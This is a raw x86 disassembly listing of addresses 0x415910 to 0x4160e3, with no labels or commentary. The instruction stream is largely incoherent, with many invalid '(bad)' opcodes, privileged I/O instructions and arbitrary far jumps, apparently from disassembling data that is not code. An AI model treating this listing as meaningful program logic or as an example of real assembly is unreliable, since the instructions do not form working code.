  415910:	popf   
  415911:	mov    ah,0x3e
  415913:	ret    0x4f5e
  415916:	outs   dx,BYTE PTR ds:[esi]
  415917:	jbe    0x4158a1
  415919:	iret   
  41591a:	jo     0x415921
  41591c:	pop    edx
  41591d:	cli    
  41591e:	mov    bl,0x74
  415920:	sbb    eax,0x8a2b51a0
  415925:	pop    ebp
  415926:	sub    al,0xde
  415928:	popa   
  415929:	xchg   BYTE PTR [esp+ecx*2-0x6f],ch
  41592d:	mov    bh,0x1f
  41592f:	fisubr WORD PTR [edx-0x4a]
  415932:	sub    al,BYTE PTR ds:0x399386f5
  415938:	repnz test al,0x31
  41593b:	fwait
  41593c:	arpl   WORD PTR [eax],ax
  41593e:	mov    al,0xea
  415941:	inc    BYTE PTR [ebx+0x3dd29f5b]
  415947:	adc    DWORD PTR [eax+0x5],0xfffffffa
  41594b:	jnp    0x415913
  41594d:	jge    0x415906
  41594f:	mov    dh,0xcc
  415951:	test   eax,0xb67aa8c6
  415956:	fisttp DWORD PTR [edi+eax*1]
  415959:	dec    ah
  41595b:	mov    esi,0xde886e07
  415960:	push   0xffffffda
  415962:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415963:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415964:	jne    0x4159c0
  415966:	add    esp,DWORD PTR [edi-0xe]
  415969:	jg     0x4158fc
  41596b:	outs   dx,DWORD PTR ds:[esi]
  41596c:	add    eax,0x70f0aef9
  415971:	or     edx,DWORD PTR [eax+0x34]
  415974:	scas   eax,DWORD PTR es:[edi]
  415975:	int3   
  415976:	or     al,0xfe
  415978:	pop    ebx
  415979:	mov    BYTE PTR [esi-0x4fdcc7a],cl
  41597f:	lods   al,BYTE PTR ds:[esi]
  415980:	in     al,dx
  415981:	fadd   st(3),st
  415983:	sbb    eax,0x7d2e680c
  415988:	sub    al,0x50
  41598a:	mov    dl,0xfe
  41598c:	test   al,0x93
  41598e:	mov    WORD PTR [edi+0x790a00bd],ss
  415994:	div    DWORD PTR [eax]
  415996:	xchg   DWORD PTR [ebp-0x3],eax
  415999:	mov    ah,0x6b
  41599b:	sar    BYTE PTR [edx-0x67],0x7d
  41599f:	mov    eax,ds:0x1fbbade0
  4159a4:	and    BYTE PTR [edx+0x34347d69],ah
  4159aa:	bound  ebp,QWORD PTR [ebp+0x2029f38]
  4159b0:	jle    0x4159bd
  4159b2:	mov    esp,edx
  4159b4:	cli    
  4159b5:	pop    ebp
  4159b6:	pushf  
  4159b7:	push   edx
  4159b8:	(bad)  
  4159b9:	xor    eax,0xaf9d63bd
  4159be:	jl     0x41598f
  4159c0:	mov    bh,0xc2
  4159c2:	std    
  4159c3:	inc    ebx
  4159c4:	stos   DWORD PTR es:[edi],eax
  4159c5:	sbb    BYTE PTR [esi],0x64
  4159c8:	lods   al,BYTE PTR ds:[esi]
  4159c9:	pop    esi
  4159ca:	pop    esi
  4159cb:	and    al,BYTE PTR [esi+0x36a22a7f]
  4159d1:	xlat   BYTE PTR ds:[ebx]
  4159d2:	adc    esp,DWORD PTR [ecx-0x54]
  4159d5:	sahf   
  4159d6:	mov    ds:0xc02b49b8,al
  4159db:	inc    edx
  4159dc:	or     dl,BYTE PTR [ecx-0xb7f109d]
  4159e2:	lea    ecx,ds:0x2c217170
  4159e8:	ins    BYTE PTR es:[edi],dx
  4159e9:	fwait
  4159ea:	xor    edx,DWORD PTR [edi+0x2f]
  4159ed:	xchg   ebp,eax
  4159ee:	ss into 
  4159f0:	loope  0x415a02
  4159f2:	inc    ebx
  4159f3:	inc    ebx
  4159f4:	jae    0x415979
  4159f6:	sahf   
  4159f7:	(bad)  
  4159f8:	pop    ebp
  4159f9:	out    dx,eax
  4159fa:	pop    ebp
  4159fb:	adc    BYTE PTR ds:0x9131249b,dl
  415a01:	inc    eax
  415a02:	add    bh,ah
  415a04:	stos   DWORD PTR es:[edi],eax
  415a05:	leave  
  415a06:	aam    0xe4
  415a08:	enter  0xa646,0xe9
  415a0c:	(bad)  
  415a0d:	hlt    
  415a0e:	ja     0x415a25
  415a10:	xor    BYTE PTR [edx],ch
  415a12:	in     al,0x82
  415a14:	push   edi
  415a15:	mov    al,ds:0xd374b994
  415a1a:	enterw 0xb807,0xaa
  415a1f:	cld    
  415a20:	cmp    al,0x84
  415a22:	mov    edx,0x977359b5
  415a27:	adc    ah,bh
  415a29:	leave  
  415a2a:	fstp   DWORD PTR [eax]
  415a2c:	mov    bh,0xa7
  415a2e:	jmp    0x562a:0xde2ee2c2
  415a35:	push   edx
  415a36:	sbb    ch,BYTE PTR [ebx+0x10d41397]
  415a3c:	pop    ss
  415a3d:	xchg   ebp,eax
  415a3e:	cmp    BYTE PTR [eax+ebx*4+0x4b],0xb3
  415a43:	and    dh,0x21
  415a46:	(bad)  
  415a47:	cmp    dh,BYTE PTR [ebx-0x30]
  415a4a:	sub    al,0x7a
  415a4c:	sbb    eax,0xefc6cad4
  415a51:	nop
  415a52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a53:	lock call FWORD PTR [eax-0x79c0b2f8]
  415a5a:	xchg   esi,eax
  415a5b:	mov    al,BYTE PTR [edx-0x4bbd51c7]
  415a61:	push   esi
  415a62:	mov    esp,0x8aa38191
  415a67:	scas   al,BYTE PTR es:[edi]
  415a68:	jg     0x415adb
  415a6a:	add    al,0x60
  415a6c:	fidiv  DWORD PTR [eax]
  415a6e:	adc    al,al
  415a70:	shl    DWORD PTR [edi-0x3b672496],1
  415a76:	pop    ds
  415a77:	out    dx,al
  415a78:	mov    esi,DWORD PTR ss:[esi-0x3a]
  415a7c:	xchg   edi,eax
  415a7d:	sbb    al,0xad
  415a7f:	call   0x6bdc:0x470d804
  415a86:	cwde   
  415a87:	adc    esi,ebp
  415a89:	mov    esp,0xf39c4b9a
  415a8e:	fadd   st,st(2)
  415a90:	and    al,0x46
  415a92:	sbb    eax,DWORD PTR [edi+0xf]
  415a95:	jl     0x415a88
  415a97:	xor    DWORD PTR [edx-0x6a],edi
  415a9a:	ret    0x21c6
  415a9d:	sbb    edx,DWORD PTR [ebx-0x3d]
  415aa0:	lock push ds
  415aa2:	je     0x415a30
  415aa4:	sbb    DWORD PTR [edx+0x1f],ebp
  415aa7:	sbb    DWORD PTR [ecx+0x133a055a],0xffffffeb
  415aae:	or     eax,0xac49c06c
  415ab3:	xor    esp,DWORD PTR ss:[ebx-0x32ae3f6d]
  415aba:	(bad)  
  415abb:	mov    eax,ecx
  415abd:	lods   al,BYTE PTR ds:[esi]
  415abe:	and    al,0x70
  415ac0:	push   ecx
  415ac1:	mov    esp,0xf828b904
  415ac6:	sub    ch,0x1b
  415ac9:	shl    edx,cl
  415acb:	add    dh,ch
  415acd:	mov    ch,0xf4
  415acf:	adc    eax,0x94b44b4a
  415ad5:	xchg   ecx,eax
  415ad6:	cmc    
  415ad7:	pop    esi
  415ad8:	call   0x1ecac0e6
  415add:	div    dh
  415adf:	jne    0x415ad7
  415ae1:	mov    ds:0xdd168dec,eax
  415ae6:	inc    ebx
  415ae7:	inc    ecx
  415ae8:	push   ss
  415ae9:	and    eax,eax
  415aeb:	and    BYTE PTR [eax+0x19b0d221],cl
  415af1:	jmp    0x26ca:0xcd50f284
  415af8:	(bad)  
  415af9:	sti    
  415afa:	retf   0x1812
  415afd:	cmp    BYTE PTR [esi-0x6fa0ce72],cl
  415b03:	jo     0x415b03
  415b05:	jb     0x415b4f
  415b07:	dec    eax
  415b08:	push   edx
  415b09:	xchg   ebx,eax
  415b0a:	(bad)  
  415b0b:	mov    edi,0xa390aa4b
  415b10:	ins    DWORD PTR es:[edi],dx
  415b11:	pop    DWORD PTR [edi-0x22]
  415b14:	or     esp,edi
  415b16:	dec    ecx
  415b17:	pop    edx
  415b18:	test   BYTE PTR [ebx+0x484b5872],bl
  415b1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b1f:	xor    edx,0x78676b42
  415b25:	mov    BYTE PTR [ebx-0xe],dh
  415b28:	sbb    bh,ch
  415b2a:	jns    0x415b8b
  415b2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b2d:	in     al,dx
  415b2e:	fldcw  WORD PTR [eax+ebp*2-0xc]
  415b32:	lods   eax,DWORD PTR ds:[esi]
  415b33:	nop
  415b34:	or     eax,0xfb45ad4
  415b39:	out    dx,al
  415b3a:	inc    eax
  415b3b:	dec    eax
  415b3c:	sahf   
  415b3d:	push   DWORD PTR [edx+0x64]
  415b40:	mov    ah,al
  415b42:	dec    eax
  415b43:	icebp  
  415b44:	jmp    0x917f:0xd66e351c
  415b4b:	js     0x415b86
  415b4d:	mov    al,ds:0x7859d192
  415b52:	push   esi
  415b53:	rol    ecx,1
  415b55:	cmp    bl,bh
  415b57:	sbb    ch,al
  415b59:	imul   dh
  415b5b:	ret    
  415b5c:	xchg   ebx,eax
  415b5d:	inc    edi
  415b5e:	pop    ebx
  415b5f:	mov    edi,0x5e87a1ca
  415b64:	or     esi,eax
  415b66:	mov    BYTE PTR [ebx+0x7d512329],bl
  415b6c:	mov    esp,0x9b908c3c
  415b71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b72:	repz int 0xac
  415b75:	dec    edi
  415b76:	adc    ebp,ebp
  415b78:	test   al,0x31
  415b7a:	pop    esi
  415b7b:	jae    0x415be8
  415b7d:	ror    ah,cl
  415b7f:	xchg   DWORD PTR [ebp-0x3f],ebp
  415b82:	sub    edx,DWORD PTR ds:[ebx+eiz*1]
  415b86:	js     0x415bda
  415b88:	sbb    al,0x4e
  415b8a:	push   0xffffff8c
  415b8c:	ins    BYTE PTR es:[edi],dx
  415b8d:	cdq    
  415b8e:	mov    esi,0x23ad11e7
  415b93:	mov    WORD PTR [esi-0x7a],ds
  415b96:	add    ch,al
  415b98:	mov    cl,0x73
  415b9a:	shl    ch,0xff
  415b9d:	and    BYTE PTR [eax],ah
  415b9f:	idiv   BYTE PTR [eax]
  415ba1:	inc    edi
  415ba2:	sub    al,0xc
  415ba4:	mov    ah,0xa2
  415ba6:	xor    ah,BYTE PTR [edx+ebx*1-0x20850b21]
  415bad:	test   cl,ah
  415baf:	add    bl,BYTE PTR [edi]
  415bb1:	loope  0x415b50
  415bb3:	push   ebx
  415bb4:	sub    eax,0x3ea89293
  415bb9:	aam    0xd1
  415bbb:	addr16 mov dl,0x22
  415bbe:	mov    BYTE PTR [ecx-0x2c70444e],dh
  415bc4:	or     eax,0xfa62f3fb
  415bc9:	(bad)  [esi]
  415bcb:	out    0xb8,al
  415bcd:	sahf   
  415bce:	call   0xca0ca01f
  415bd3:	(bad)  
  415bd4:	pusha  
  415bd5:	pop    edi
  415bd6:	out    0xbc,al
  415bd8:	data16 int 0x6c
  415bdb:	jmp    0x5d07:0x50da8d03
  415be2:	xchg   ecx,eax
  415be3:	jecxz  0x415bc6
  415be5:	pop    edx
  415be6:	div    BYTE PTR [ebx+0x61]
  415be9:	xchg   edi,eax
  415bea:	mov    edx,0xccd41e94
  415bef:	xchg   esp,eax
  415bf0:	clc    
  415bf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415bf2:	xor    ebx,DWORD PTR [eax]
  415bf4:	mov    edi,0xb80f3a4c
  415bf9:	lods   eax,DWORD PTR ds:[esi]
  415bfa:	pusha  
  415bfb:	mov    ch,0xeb
  415bfd:	mov    dh,0x98
  415bff:	rol    DWORD PTR [eax-0x35bd7cc7],0x17
  415c06:	sbb    DWORD PTR [edi+eax*4],ecx
  415c09:	aam    0xc4
  415c0b:	mov    DWORD PTR [ecx+0x66],ebx
  415c0e:	test   bl,ah
  415c10:	jo     0x415c06
  415c12:	gs jno 0x415c7b
  415c15:	xor    al,0x71
  415c17:	ss dec ebp
  415c19:	dec    ebp
  415c1a:	pop    edx
  415c1b:	dec    esi
  415c1c:	mov    bh,0xd7
  415c1e:	dec    edx
  415c1f:	sbb    al,0x37
  415c21:	adc    al,0xb4
  415c23:	call   0x682c:0xd831881d
  415c2a:	jecxz  0x415c36
  415c2c:	add    eax,0xa28213fa
  415c31:	bound  eax,QWORD PTR [edx-0x2c59f1d7]
  415c37:	xor    BYTE PTR [eax+0x37],cl
  415c3a:	mov    bh,0x32
  415c3c:	or     al,0x36
  415c3e:	dec    esi
  415c3f:	mov    ecx,DWORD PTR [ebp-0x185179fa]
  415c45:	cli    
  415c46:	and    dh,BYTE PTR [eax*8+0x4e992385]
  415c4d:	pushf  
  415c4e:	jecxz  0x415c6d
  415c50:	in     al,dx
  415c51:	stos   DWORD PTR es:[edi],eax
  415c52:	xchg   esi,eax
  415c53:	fnstcw WORD PTR [edi-0x494f5298]
  415c59:	retf   0x6a9c
  415c5c:	dec    esi
  415c5d:	(bad)  
  415c5f:	xchg   esp,eax
  415c60:	adc    DWORD PTR [eax+esi*2],eax
  415c63:	into   
  415c64:	ins    DWORD PTR es:[edi],dx
  415c65:	xor    DWORD PTR [eax],ebx
  415c67:	je     0x415cc3
  415c69:	mov    ch,0x82
  415c6b:	xor    DWORD PTR [esi+0x23ee1682],esi
  415c71:	out    0x7c,al
  415c73:	sar    BYTE PTR [edi+ebx*1+0x3],0x5
  415c78:	sub    cl,cl
  415c7a:	repz and eax,0xc5def750
  415c80:	daa    
  415c81:	push   edi
  415c82:	pop    ebp
  415c83:	rcr    BYTE PTR [esi-0x55],0x12
  415c87:	into   
  415c88:	or     DWORD PTR [edi],eax
  415c8a:	nop
  415c8b:	cdq    
  415c8c:	(bad)  
  415c8d:	jnp    0x415c92
  415c8f:	stos   DWORD PTR es:[edi],eax
  415c90:	dec    esp
  415c91:	sbb    al,0x40
  415c93:	xchg   ebx,eax
  415c94:	add    eax,esi
  415c96:	push   cs
  415c97:	push   eax
  415c98:	hlt    
  415c99:	(bad)  
  415c9a:	push   ss
  415c9b:	pushf  
  415c9c:	imul   ecx,ebx,0xbc08eb01
  415ca2:	int3   
  415ca3:	div    DWORD PTR [ebp+0x503b730a]
  415ca9:	retf   
  415caa:	pop    es
  415cab:	cmp    al,0xc8
  415cad:	pop    es
  415cae:	mov    al,ds:0xf7af4986
  415cb3:	(bad)  
  415cb4:	mov    al,ds:0xf6f334d4
  415cb9:	sub    edx,ecx
  415cbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cbc:	arpl   si,bx
  415cbe:	test   eax,0x216e2f8b
  415cc3:	add    eax,0x879f1961
  415cc8:	add    DWORD PTR [edx],ebp
  415cca:	jno    0x415cf4
  415ccc:	mov    BYTE PTR [esi+0x64],ah
  415ccf:	xchg   esp,eax
  415cd0:	es pop edi
  415cd2:	lods   eax,DWORD PTR ds:[esi]
  415cd3:	xchg   ebp,eax
  415cd4:	fld    st(6)
  415cd6:	push   es
  415cd7:	jmp    0x14d8:0xa2a99a76
  415cde:	fdivr  QWORD PTR [ebp-0x18]
  415ce1:	mov    dl,0xe7
  415ce3:	sub    bl,al
  415ce5:	cmp    BYTE PTR [edi],0x7f
  415ce8:	lods   al,BYTE PTR ds:[esi]
  415ce9:	sub    BYTE PTR [edx-0x75a89d25],ah
  415cef:	mov    al,bl
  415cf1:	out    dx,eax
  415cf2:	jae    0x415cfb
  415cf4:	adc    edx,eax
  415cf6:	pop    ds
  415cf7:	shl    DWORD PTR [eax+0x15af8733],cl
  415cfd:	repnz or BYTE PTR [ecx-0x5f],dh
  415d01:	or     ecx,DWORD PTR [eax]
  415d03:	or     cl,ch
  415d05:	push   0xffffff96
  415d07:	jno    0x415ca6
  415d09:	push   ss
  415d0a:	shr    eax,1
  415d0c:	sbb    eax,0x113f0909
  415d11:	mov    ds:0x17b46da4,eax
  415d16:	add    eax,0x766f058c
  415d1b:	push   edi
  415d1c:	add    cl,ah
  415d1e:	loope  0x415d05
  415d20:	pop    edx
  415d21:	sub    eax,0x3a8b6ee8
  415d26:	mov    dh,0x13
  415d28:	es add eax,DWORD PTR gs:[edi-0x5b5455a8]
  415d30:	and    al,0x4b
  415d32:	int    0xd1
  415d34:	inc    eax
  415d35:	jmp    0x94a5fd6b
  415d3a:	call   0x25a97f05
  415d3f:	inc    ebp
  415d40:	inc    ebp
  415d41:	pop    ebp
  415d42:	cdq    
  415d43:	data16 and cl,BYTE PTR [ebp-0x1bc02771]
  415d4a:	call   0xab3edf56
  415d4f:	idiv   BYTE PTR [ebx+0x6e5dd214]
  415d55:	out    dx,al
  415d56:	ds sbb eax,0x88ac9b37
  415d5c:	mov    eax,0xcd45a89b
  415d61:	cmc    
  415d62:	shl    BYTE PTR ds:0xbd1f00cc,0x2a
  415d69:	mov    dl,0xe5
  415d6b:	pop    ss
  415d6c:	xchg   DWORD PTR [ecx+0x4933af7b],esi
  415d72:	sar    BYTE PTR [ebx],cl
  415d74:	push   cs
  415d75:	cdq    
  415d76:	mov    dh,0x5a
  415d78:	mov    WORD PTR [ebp+0x548a2f4e],es
  415d7e:	rcr    BYTE PTR [esi+0x300c10a5],cl
  415d84:	leave  
  415d85:	sti    
  415d86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d87:	retf   0x691d
  415d8a:	inc    esp
  415d8b:	rol    DWORD PTR [edi],1
  415d8d:	sub    dh,0x4d
  415d90:	jb     0x415d69
  415d92:	push   edi
  415d93:	fimul  WORD PTR [edx+0x64cfa529]
  415d99:	mov    WORD PTR [ecx-0x1f783196],es
  415d9f:	test   DWORD PTR [edi+0xa89d823],0x4c067606
  415da9:	les    esp,FWORD PTR [eax]
  415dab:	xor    eax,0xa8805b4
  415db0:	push   esi
  415db1:	adc    al,0x92
  415db3:	test   DWORD PTR [esi],ecx
  415db5:	mov    edx,0x69cca45c
  415dba:	(bad)  
  415dbb:	mov    dh,0x72
  415dbd:	pop    esp
  415dbe:	adc    ecx,DWORD PTR [esp+eiz*2+0x2]
  415dc2:	js     0x415d8f
  415dc4:	xor    al,0x92
  415dc6:	push   ecx
  415dc7:	hlt    
  415dc8:	aad    0x53
  415dca:	sbb    DWORD PTR [ecx-0x4a],0x58
  415dce:	in     al,0x1f
  415dd0:	icebp  
  415dd1:	aad    0xf8
  415dd3:	sbb    esi,DWORD PTR [edi]
  415dd5:	lods   eax,DWORD PTR ds:[esi]
  415dd6:	popa   
  415dd7:	fs out 0xfe,al
  415dda:	inc    edi
  415ddb:	xchg   ecx,eax
  415ddc:	pop    ebx
  415ddd:	call   0x44b6:0x6685df83
  415de4:	push   ebx
  415de5:	sbb    eax,0x7702b921
  415dea:	mov    ebp,0xa90396ca
  415def:	loopne 0x415e44
  415df1:	cli    
  415df2:	test   DWORD PTR [ecx-0x2e],esp
  415df5:	add    eax,DWORD PTR [ebx+eax*2+0x7a39c396]
  415dfc:	sbb    BYTE PTR [ebp+0x4aa66111],cl
  415e02:	ret    0x5996
  415e05:	in     al,0xe5
  415e07:	scas   eax,DWORD PTR es:[edi]
  415e08:	dec    ebp
  415e09:	sub    esp,DWORD PTR [edx+edx*2+0x9e0471]
  415e10:	jae    0x415dc8
  415e12:	mov    ebp,0xde9ee29
  415e17:	repnz xor DWORD PTR [edi+esi*1-0x3920e74f],0xffffffd1
  415e20:	les    ecx,FWORD PTR [esi]
  415e22:	dec    edx
  415e23:	push   esi
  415e24:	jecxz  0x415e35
  415e26:	adc    ecx,DWORD PTR [eax-0x3e2a4f2a]
  415e2c:	xor    ch,al
  415e2e:	pop    ds
  415e2f:	push   esi
  415e30:	pushf  
  415e31:	cmp    ebx,ebx
  415e33:	(bad)  
  415e34:	aam    0xe7
  415e36:	sub    al,0x61
  415e38:	test   eax,0xea61f2c7
  415e3d:	push   edi
  415e3e:	push   ss
  415e3f:	jle    0x415e0d
  415e41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e42:	mov    ds:0xdc311640,eax
  415e47:	out    0xc7,eax
  415e49:	loope  0x415dcf
  415e4b:	cmp    DWORD PTR [esi+0x46],edi
  415e4e:	das    
  415e4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e50:	jl     0x415e79
  415e52:	inc    ebp
  415e53:	inc    esp
  415e54:	adc    dh,BYTE PTR [eax-0x7cfcc027]
  415e5a:	or     BYTE PTR [ecx+0x34522170],al
  415e60:	ficom  WORD PTR [ecx]
  415e62:	inc    ebp
  415e63:	loop   0x415e4b
  415e65:	mov    edi,0xe380f853
  415e6a:	out    0x99,eax
  415e6c:	rol    BYTE PTR [ecx+0x24],1
  415e6f:	mov    bh,0xa0
  415e71:	je     0x415df6
  415e73:	test   eax,0xcf528706
  415e78:	test   dh,0x86
  415e7b:	pop    ecx
  415e7c:	aas    
  415e7d:	push   cs
  415e7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e7f:	in     al,0x67
  415e81:	pusha  
  415e82:	inc    edi
  415e83:	aam    0x28
  415e85:	aam    0xb9
  415e87:	retf   0x321
  415e8a:	ret    
  415e8b:	mov    eax,DWORD PTR [edx+0x17]
  415e8e:	call   0x59b0:0xcae711a7
  415e95:	dec    ebx
  415e96:	jecxz  0x415eca
  415e98:	ret    
  415e99:	out    0x1a,al
  415e9b:	lock inc edi
  415e9d:	or     BYTE PTR [edi],0x6c
  415ea0:	cld    
  415ea1:	in     al,0x9e
  415ea3:	call   0x35d161fe
  415ea8:	jb     0x415e81
  415eaa:	jae    0x415e68
  415eac:	sbb    ch,dh
  415eae:	daa    
  415eaf:	(bad)  
  415eb0:	cmp    ah,ch
  415eb2:	or     al,0xb7
  415eb4:	pop    edx
  415eb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415eb6:	mov    ebx,esp
  415eb8:	dec    ebx
  415eb9:	ret    0x1425
  415ebc:	xchg   edi,eax
  415ebd:	mov    esi,0x90134893
  415ec2:	popa   
  415ec3:	inc    ecx
  415ec4:	mov    eax,0xe1d1b060
  415ec9:	imul   ebx,esi,0xba5f31b7
  415ecf:	(bad)  
  415ed0:	arpl   WORD PTR [ebx+ebx*8-0x4e],ax
  415ed4:	or     al,0x2c
  415ed6:	push   cs
  415ed7:	shr    ah,1
  415ed9:	in     al,0x33
  415edb:	shl    BYTE PTR [ecx],1
  415edd:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415edf:	std    
  415ee0:	fld    TBYTE PTR [ecx]
  415ee2:	ficom  WORD PTR [ecx-0x2e0cd45a]
  415ee8:	gs retf 0x80d0
  415eec:	pop    esi
  415eed:	popf   
  415eee:	fmul   QWORD PTR [esi-0x1c7a374d]
  415ef4:	std    
  415ef5:	or     ecx,DWORD PTR [ebx-0x281731ae]
  415efb:	pop    edx
  415efc:	xlat   BYTE PTR ds:[ebx]
  415efd:	xor    ah,BYTE PTR [edi+eiz*8]
  415f00:	sbb    BYTE PTR [ecx+0x612e8be],dl
  415f06:	loopne 0x415e90
  415f08:	jecxz  0x415f1b
  415f0a:	xlat   BYTE PTR ds:[ebx]
  415f0b:	mov    ecx,0x9f00889
  415f10:	pop    ebx
  415f11:	in     al,dx
  415f12:	leave  
  415f13:	adc    ecx,DWORD PTR [eax+edx*8-0x32]
  415f17:	lock repz loopne 0x415f15
  415f1b:	stos   DWORD PTR es:[edi],eax
  415f1c:	mov    al,es:0x6c6a7cfe
  415f22:	cmp    bl,BYTE PTR [edx+0x12]
  415f25:	inc    ebx
  415f26:	fcomp  DWORD PTR [esi]
  415f28:	inc    ebp
  415f29:	out    0xec,al
  415f2b:	mov    esp,0x8469b1c1
  415f30:	dec    eax
  415f31:	push   esp
  415f32:	pop    ds
  415f33:	sar    eax,1
  415f35:	and    DWORD PTR ds:0x2c4cca8b,0x8e78698b
  415f3f:	mov    dl,0xbe
  415f41:	mov    ah,0xaa
  415f43:	xchg   ebp,eax
  415f44:	mov    DWORD PTR [esi],edi
  415f46:	leave  
  415f47:	or     BYTE PTR [ebx-0x35],dh
  415f4a:	test   BYTE PTR [edi-0x7],dl
  415f4d:	shl    DWORD PTR ds:0x637e1d36,1
  415f53:	jbe    0x415f94
  415f55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f56:	imul   ebx,DWORD PTR [esi-0x4cc58b85],0x932fcce2
  415f60:	icebp  
  415f61:	out    dx,al
  415f62:	xchg   edi,eax
  415f63:	inc    ebp
  415f64:	hlt    
  415f65:	fs push ds
  415f67:	retf   
  415f68:	out    dx,al
  415f69:	dec    ebx
  415f6a:	pusha  
  415f6b:	(bad)  
  415f6c:	xchg   esi,eax
  415f6d:	and    ah,dh
  415f6f:	data16 test al,0xe6
  415f72:	dec    edi
  415f73:	je     0x415f3d
  415f75:	(bad)  
  415f76:	push   ebx
  415f77:	fld    TBYTE PTR [ebp+ebp*8-0xb]
  415f7b:	jbe    0x415f54
  415f7d:	pop    esp
  415f7e:	sbb    BYTE PTR ds:0x13680061,al
  415f84:	sbb    BYTE PTR [edx+0x41abd56e],dh
  415f8a:	int3   
  415f8b:	mov    esp,0xeefebec1
  415f90:	dec    esp
  415f91:	push   eax
  415f92:	test   al,0xa4
  415f94:	data16 loopne 0x415f31
  415f97:	push   ebx
  415f98:	aam    0x17
  415f9a:	mov    dh,0x2c
  415f9c:	dec    esp
  415f9d:	xchg   ecx,eax
  415f9e:	sbb    al,0x36
  415fa0:	je     0x415fcd
  415fa2:	repnz out 0xe0,eax
  415fa5:	sbb    DWORD PTR [bx+si],eax
  415fa8:	dec    ebp
  415fa9:	mov    bl,0x34
  415fab:	mov    cl,0x81
  415fad:	pop    ds
  415fae:	lods   al,BYTE PTR ds:[esi]
  415faf:	mov    cl,0xf
  415fb1:	cdq    
  415fb2:	outs   dx,DWORD PTR cs:[esi]
  415fb4:	pop    esi
  415fb5:	gs xor al,0x66
  415fb8:	push   ss
  415fb9:	mul    BYTE PTR ds:[ebx]
  415fbc:	call   0xaada:0x36a29eb3
  415fc3:	out    dx,al
  415fc4:	mov    bl,0x88
  415fc6:	sub    eax,0xc892a22
  415fcb:	inc    ecx
  415fcc:	sub    al,0x8f
  415fce:	xor    eax,0x88326116
  415fd3:	mov    esp,0x214e98b0
  415fd8:	and    ebx,DWORD PTR [ebp-0x5f]
  415fdb:	mov    esp,0x9e132867
  415fe0:	shr    edx,0x79
  415fe3:	pop    es
  415fe4:	pop    esp
  415fe5:	sti    
  415fe6:	mov    BYTE PTR [ebp+ebx*2+0x51],0xcc
  415feb:	xor    BYTE PTR [esi-0x41],dh
  415fee:	push   ds
  415fef:	mov    ecx,0xe3f835b9
  415ff4:	xor    eax,0x2a3e6e54
  415ff9:	(bad)  
  415ffa:	sbb    eax,DWORD PTR [ecx+ecx*1+0x4c0c9cef]
  416001:	push   ebp
  416002:	out    0x82,al
  416004:	rcr    DWORD PTR [ecx+0x2c6d7358],cl
  41600a:	scas   ax,WORD PTR es:[edi]
  41600c:	adc    BYTE PTR [edx-0x46c1ed84],al
  416012:	push   edx
  416013:	lds    edi,FWORD PTR [eax]
  416015:	xor    eax,0xe1b8b79b
  41601a:	sbb    ecx,edi
  41601c:	mov    ebp,0x11ccb2fc
  416021:	das    
  416022:	cmp    BYTE PTR [edx],0x44
  416025:	(bad)  
  416026:	leave  
  416027:	cmp    al,0x8
  416029:	or     esi,DWORD PTR [edi-0x1c]
  41602c:	std    
  41602d:	(bad)  
  41602e:	mov    ds:0x37a61fd9,eax
  416033:	pop    ecx
  416034:	call   FWORD PTR [edi]
  416036:	(bad)  
  416037:	mov    eax,ds:0x6b8b3380
  41603c:	popf   
  41603d:	mov    al,0xd9
  41603f:	inc    ecx
  416040:	ror    DWORD PTR [eax],cl
  416042:	cmp    al,0x3f
  416044:	and    al,0x3
  416046:	out    0x30,eax
  416048:	jbe    0x415fe5
  41604a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41604b:	jo     0x41604e
  41604d:	mov    esp,esi
  41604f:	sbb    eax,0x49c57f94
  416054:	out    0x4,eax
  416056:	mov    WORD PTR [esp+esi*8],?
  416059:	fs push ecx
  41605b:	sub    DWORD PTR [eax-0x6b],esi
  41605e:	mov    al,ds:0x623d07e6
  416063:	std    
  416064:	add    eax,DWORD PTR [esp+edi*1+0x1215a248]
  41606b:	xor    eax,0x8415863f
  416070:	mov    ebx,0xfe18b1da
  416075:	(bad)  
  416076:	call   0x2b6e:0x6fb1cc7a
  41607d:	jecxz  0x416095
  41607f:	pusha  
  416080:	call   0x6ca6:0xdba244b8
  416087:	ins    BYTE PTR es:[edi],dx
  416088:	inc    DWORD PTR [ebx+0xf6358dd]
  41608e:	shl    cl,1
  416090:	ret    0x7bd0
  416093:	call   edi
  416095:	push   ecx
  416096:	or     ecx,DWORD PTR [ebx+0x342394e6]
  41609c:	jp     0x41608b
  41609e:	inc    edx
  41609f:	xchg   ecx,eax
  4160a0:	popa   
  4160a1:	cwde   
  4160a2:	mov    cl,BYTE PTR [eax+0x37a54b29]
  4160a8:	ret    
  4160a9:	adc    eax,DWORD PTR [eax]
  4160ab:	out    dx,al
  4160ac:	and    BYTE PTR [esi+0x7c],ah
  4160af:	mov    ecx,0x9f7216bd
  4160b4:	jg     0x4160be
  4160b6:	mov    ecx,0x6a0718da
  4160bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160bc:	retf   0xf232
  4160bf:	inc    eax
  4160c0:	or     esp,DWORD PTR [ebp+0x60f7dc35]
  4160c6:	lock jmp 0x3856:0x39088bd9
  4160ce:	cmp    al,BYTE PTR [edi-0x2b]
  4160d1:	cld    
  4160d2:	cmp    al,0x19
  4160d4:	mov    bh,0x88
  4160d6:	jge    0x41605a
  4160d8:	push   ds
  4160d9:	pop    edx
  4160da:	sti    
  4160db:	pop    ebp
  4160dc:	pop    ebp
  4160dd:	xchg   ebx,eax
  4160de:	push   0x24d57691
  4160e3:	in     al,dx
